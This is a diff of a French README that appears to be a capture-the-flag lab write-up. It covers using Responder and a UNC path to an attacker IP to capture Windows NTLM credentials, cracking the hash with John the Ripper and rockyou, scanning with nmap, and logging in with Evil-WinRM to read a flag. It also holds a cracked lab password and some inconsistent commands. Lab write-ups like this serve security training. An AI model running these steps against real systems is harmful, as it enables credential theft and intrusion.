@@ -1,56 +1,65 @@
-Bien sûr, voici le README simplifié pour un seul copier-coller :
 
-markdown
-Copy code
-# Guide d'exploitation avec Responder, John The Ripper et Evil-WinRM
+# Guide Responder
 
-## Task 7 - Utilisation de Responder
+## ---------- Task 7
 
-Utilisez Responder avec l'interface spécifiée :
+
+## Dans le terminal
+
+Le flag `-I` de Responder permet de spécifier une interface. Voici un exemple d'utilisation :
+
 ```bash
 responder -I 10.10.14.92
-Dans le navigateur, accédez à :
+```
+Avec cette commande nous faisons appel a l'outils puis on y insert le flag -I pour pouvoir préciser une interface.<br/>
 
-bash
-Copy code
+## Dans le navigateur
+
+```bash
 http://domaine.cible\\10.10.14.92/toto
-http://domaine.cible : Domaine cible.
-\\10.10.14.92 : Adresse IP spécifiée dans Responder.
-/toto : Dossier fictif pour recevoir les informations collectées par Responder.
-Task 8 - John The Ripper
-Utilisez John The Ripper pour cracker des mots de passe :
+```
+Dans le navigateur nous allons préciser le domaine que nous voulons exploiter, l'adresse IP vers la quelle les information doivent être renvoyer pui finalement nous y insserons un dossier fictif vers le quelle les information sont censer écrite
 
-bash
-Copy code
-john --wordlist=/usr/share/wordlists/rockyou.txt
-Task 9 - Décryptage avec John The Ripper
-Utilisez John The Ripper avec une wordlist spécifique pour trouver le mot de passe :
+## ---------- Task 8 - John The Ripper
 
-bash
-Copy code
-john --wordlist=/usr/share/wordlists/rockyou.txt
-Résultat : badminbton
+Trouver l'outils qui permet de crack des password et souvent appeller john!
 
-Task 10 - Scan Nmap de base
-Effectuez un scan Nmap de base et précisez les 6000 premiers scans pour le port 5985 :
+-> John The Ripper Obviously!
 
-bash
-Copy code
-nmap -p 1-1000 -sV -sC [ip]
-Task 11 - Exploitation avec Evil-WinRM
+## ---------- Task 9 - Décryptage avec John The Ripper
+
+Decryptons le password en utilisant john the ripper
+
+command utiliser -> john --wordlist=/usr/share/wordlists/rockyou.txt
+
+on appel john puis on lui passe une wordlist bien précise pour ne pas qu'il passe tout en revu et pour une question de rapidité et clui ci nous retourneras si tout ce passe bien le mot de passe voulu
+	
+
+Résultat -> badminbton Obviously!!!
+
+## ---------- Task 10 - Scan Nmap
+
+precision des 6000 premier port pour un scan plus large car lors de la tache un sans precision celui ci a scan que les 1000 premier port
+
+avec -> 
+	namp -p int1-int2 -sV -sC [ip]
+	
+ainsi on voit le port 5985 reponse a la task 10
+
+## ---------- Task 11 - Exploitation avec Evil-WinRM
+
 Téléchargez Evil-WinRM.
+
 Connectez-vous à la cible :
-bash
-Copy code
-evil-winrm -i [ip] -u 'admin name' -p 'password de la cible'
-Après quelques recherches dans les fichiers divers, le flag est trouvé à :
 
-bash
-Copy code
+evil-winrm -i [ip] (de la cible) -u 'admin name' -p 'password de la cible'
+
+Après quelques recherches dans les fichiers divers, le flag est trouvé à l'emplacement:
+
 /user/mike/desktop/flag.txt
+
+## -------
+
 Note : Assurez-vous d'agir de manière éthique et légale dans toutes les activités de sécurité informatique. Respectez toujours les règles et les politiques en place.
-
-less
-Copy code
-
-Copiez-collez simplement ce bloc de texte dans votre fichier README. N'oubliez pas de remplacer `[ip]`, `http://domaine.cible`, et autres éléments spécifiques par vos valeurs réelles.
+```bash
+```
